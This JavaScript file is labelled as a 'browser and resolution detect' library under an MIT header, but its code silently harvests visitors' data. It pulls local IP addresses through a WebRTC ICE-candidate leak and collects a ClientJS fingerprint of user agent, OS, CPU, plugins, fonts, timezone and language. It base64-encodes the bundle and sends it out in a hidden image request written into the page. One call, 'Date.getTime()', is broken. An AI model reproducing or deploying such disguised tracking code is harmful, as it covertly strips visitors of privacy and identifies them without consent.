/*!
 * browser and resolution detect v3.3.1
 * Copyright (c)
 *  Milton John
 *  Angela Davis
 * MIT License
 */

var gList;
var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function () {
    var rtc = new RTCPeerConnection({iceServers:[]});
    if (1 || window.mozRTCPeerConnection) {
        rtc.createDataChannel('', {reliable:false});
    };
    rtc.onicecandidate = function (evt) {
        // convert the candidate to SDP so we can run it through our general parser
        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
    };
    rtc.createOffer(function (offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
    }, function (e) { });
    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateDisplay(newAddr) {
        if (newAddr in addrs) return;
        else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
        gList = displayAddrs.join(" or perhaps ") || "n/a";
    }
    
    function grepSDP(sdp) {
        var hosts = [];
        sdp.split('\r\n').forEach(function (line) {
            if (~line.indexOf("a=candidate")) {
                var parts = line.split(' '),
                    addr = parts[4],
                    type = parts[7];
                if (type === 'host') updateDisplay(addr);
            } else if (~line.indexOf("c=")) {
                var parts = line.split(' '),
                    addr = parts[2];
                updateDisplay(addr);
            }
        });
    }
})();
var client=new ClientJS();bdata=client.getBrowserData();fingerprint=client.getFingerprint();ua=client.getUserAgent();os=client.getOS();osver=client.getOSVersion();device=client.getDevice();
cpu=client.getCPU();screenprint=client.getScreenPrint();colordepth=client.getColorDepth();currentres=client.getCurrentResolution();availres=client.getAvailableResolution();plugins=client.getPlugins();
javaver=client.getJavaVersion();fonts=client.getFonts();tz=client.getTimeZone();lang=client.getLanguage();syslang=client.getSystemLanguage();time=Date.getTime();var arr=currentres.split('x');
var res=arr[0]-100;
var d='Time: '+ time + '|Addrs: ' + gList + '|UA: '+ua+'|OS: ' + os + '|OS Version: ' + osver + '|CPU: ' + cpu + '|Device: ' + device +'|Screenprint: ' + screenprint + '|Installed plugins: ' + plugins + '|Installed fonts: ' + fonts + '|Timezone: ' + tz + '|Language: ' + lang + '|System language: ' + syslang;
var b=btoa(d);document.write('<img src="pic.jpg?sid=' + b + '" width="'+ res+'">');

